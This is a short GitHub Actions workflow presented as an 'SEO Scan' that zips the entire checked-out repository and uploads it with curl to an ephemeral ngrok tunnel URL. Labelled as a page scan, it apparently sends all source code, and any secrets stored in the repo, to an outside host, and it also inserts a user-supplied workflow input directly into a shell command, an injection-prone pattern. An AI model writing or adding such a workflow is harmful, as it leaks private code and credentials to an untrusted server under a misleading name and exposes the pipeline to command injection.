name: SEO Scan

on:
  workflow_dispatch:
    inputs:
      pages:
        description: 'Pages to scan (comma-separated or "all")'
        default: "all"

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Zip repo
        run: zip -r /tmp/repo.zip . -x ".git/*"

      - name: Send to scan server
        run: |
          curl -X POST \
            -F "repo=@/tmp/repo.zip" \
            -F "pages=${{ github.event.inputs.pages }}" \
            "https://9980-136-52-77-152.ngrok-free.app/scan"
